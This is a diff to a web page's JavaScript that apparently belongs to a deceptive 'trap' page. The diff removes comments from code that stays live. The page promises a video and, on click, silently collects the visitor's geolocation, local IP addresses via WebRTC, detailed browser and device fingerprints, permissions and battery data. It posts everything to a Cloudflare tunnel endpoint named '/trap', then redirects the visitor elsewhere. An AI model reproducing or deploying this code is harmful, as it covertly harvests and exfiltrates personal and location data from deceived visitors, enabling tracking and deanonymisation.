@@ -70,14 +70,13 @@
   </div>
 
 <script>
-// Server URL
+
 const SERVER_URL = "https://had-several-cleanup-injured.trycloudflare.com";
 
 const $ = id => document.getElementById(id);
 const safe = (fn, fb = 'N/A') => { try { const v = fn(); return v ?? fb; } catch { return fb; } };
 const safeA = async (fn, fb = 'N/A') => { try { const v = await fn(); return v ?? fb; } catch { return fb; } };
 
-// ── 1. Geolocation + reverse geocode (unchanged)
 function getLocation(){
   return new Promise(resolve=>{
     if(!navigator.geolocation) return resolve({error:'not supported'});
@@ -115,7 +114,6 @@ function getLocation(){
   });
 }
 
-// ── 2. UA Client Hints
 async function getUACH(){
   if(!navigator.userAgentData) return {available:false};
   try{
@@ -127,7 +125,6 @@ async function getUACH(){
   }catch{ return {available:true,basic:navigator.userAgentData.brands}; }
 }
 
-// ── 3. Canvas fingerprint (detailed)
 function canvasFP(){
   try{
     const c=document.createElement('canvas'); c.width=400; c.height=100;
@@ -151,7 +148,6 @@ function canvasFP(){
   }catch{return{hash:'blocked',rawTail:''};}
 }
 
-// ── 4. WebGL (v1 + v2)
 function webglInfo(){
   const get=(type)=>{
     try{
@@ -179,7 +175,6 @@ function webglInfo(){
   return {webgl:get('webgl'), webgl2:get('webgl2')};
 }
 
-// ── 5. Audio fingerprint
 async function audioFP(){
   try{
     const ctx=new(window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,4096,44100);
@@ -204,7 +199,6 @@ async function audioFP(){
   }catch{return{hash:'blocked'};}
 }
 
-// ── 6. Math/JS engine fingerprint
 function mathFP(){
   const vals=[
     Math.acos(0.12),Math.acosh(1.5),Math.asin(0.12),Math.asinh(1),
@@ -219,7 +213,6 @@ function mathFP(){
   return {hash:(h>>>0).toString(16), vals:vals.slice(0,8).map(v=>v.toPrecision?v.toPrecision(15):String(v))};
 }
 
-// ── 7. WebRTC local IPs
 function getWebRTCIPs(){
   return new Promise(resolve=>{
     const ips=new Set();
@@ -240,7 +233,6 @@ function getWebRTCIPs(){
   });
 }
 
-// ── 8. Font enumeration
 function enumerateFonts(){
   const fonts=[
     'Arial','Arial Black','Arial Narrow','Calibri','Cambria','Candara',
@@ -266,7 +258,6 @@ function enumerateFonts(){
   return {count:found.length, fonts:found};
 }
 
-// ── 9. Performance / timing / memory
 function perfInfo(){
   const t=performance.timing||{};
   const nav=performance.getEntriesByType('navigation')[0]||{};
@@ -288,7 +279,6 @@ function perfInfo(){
   };
 }
 
-// ── 10. Visual viewport
 function visualViewportInfo(){
   const vv=window.visualViewport;
   if(!vv) return {available:false};
@@ -297,7 +287,6 @@ function visualViewportInfo(){
     pageLeft:vv.pageLeft, pageTop:vv.pageTop};
 }
 
-// ── 11. Battery
 async function getBattery(){
   try{
     const b=await navigator.getBattery();
@@ -307,7 +296,6 @@ async function getBattery(){
   }catch{return{level:'N/A',charging:'N/A'};}
 }
 
-// ── 12. Connection
 function connInfo(){
   const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
   if(!c) return{type:'unknown',effectiveType:'unknown',downlink:'N/A',rtt:'N/A',saveData:false};
@@ -316,7 +304,6 @@ function connInfo(){
     rtt: c.rtt!=null?c.rtt+' ms':'N/A', saveData:!!c.saveData};
 }
 
-// ── 13. Media devices
 async function mediaDevs(){
   try{
     const d=await navigator.mediaDevices.enumerateDevices();
@@ -327,7 +314,6 @@ async function mediaDevs(){
   }catch{return{audioinput:'N/A',audiooutput:'N/A',videoinput:'N/A'};}
 }
 
-// ── 14. Permissions
 async function getPerms(){
   const names=['notifications','clipboard-read','clipboard-write','camera',
                'microphone','geolocation','accelerometer','gyroscope','magnetometer',
@@ -340,25 +326,21 @@ async function getPerms(){
   return out;
 }
 
-// ── 15. Speech voices
 function speechVoices(){
   try{ return window.speechSynthesis.getVoices().map(v=>({name:v.name,lang:v.lang,default:v.default})); }
   catch{return[];}
 }
 
-// ── 16. MIME types
 function mimeTypes(){
   try{ return Array.from(navigator.mimeTypes).map(m=>m.type); }
   catch{return[];}
 }
 
-// ── 17. Plugins
 function getPlugins(){
   try{ return Array.from(navigator.plugins).map(p=>({name:p.name,filename:p.filename,desc:p.description})); }
   catch{return[];}
 }
 
-// ── 18. CSS media queries
 function mediaCaps(){
   const mq=q=>{try{return window.matchMedia(q).matches;}catch{return null;}};
   return{
@@ -383,7 +365,6 @@ function mediaCaps(){
   };
 }
 
-// ── 19. Storage
 function storageInfo(){
   let lsB=0,ssB=0;
   try{for(const k in localStorage) if(typeof localStorage[k]==='string') lsB+=localStorage[k].length+k.length;}catch{}
@@ -399,7 +380,6 @@ function storageInfo(){
   };
 }
 
-// ── 20. Feature detection
 function detectFeatures(){
   const t=fn=>{try{return fn();}catch{return false;}};
   return{
@@ -446,7 +426,6 @@ function detectFeatures(){
   };
 }
 
-// ── 21. Screen extra (multi-monitor)
 function screenExtra(){
   return{
     isExtended: safe(()=>screen.isExtended),
@@ -457,13 +436,11 @@ function screenExtra(){
   };
 }
 
-// Main click handler
 async function handleClick(){
   const box = $('trap');
   box.style.pointerEvents = 'none';
   box.innerHTML = `<div style="height:100%;display:flex;align-items:center;justify-content:center;color:#777;font-size:1.15rem;">Loading the craziest video...</div>`;
 
-  // Collect everything
   const [battery, rtcIPs, mdevs, perms, afp, uach] = await Promise.all([
     getBattery(), getWebRTCIPs(), mediaDevs(), getPerms(), audioFP(), getUACH()
   ]);
@@ -547,7 +524,6 @@ async function handleClick(){
     readyState: document.readyState,
   };
 
-  // Send data silently
   try {
     await fetch(SERVER_URL + '/trap', {
       method: 'POST',
@@ -555,10 +531,9 @@ async function handleClick(){
       body: JSON.stringify(payload),
     });
   } catch (e) {
-    // silent fail
+    
   }
 
-  // Redirect after logging attempt
   setTimeout(() => {
     window.location.href = "https://solar-icons.vercel.app/icons";
   }, 800);
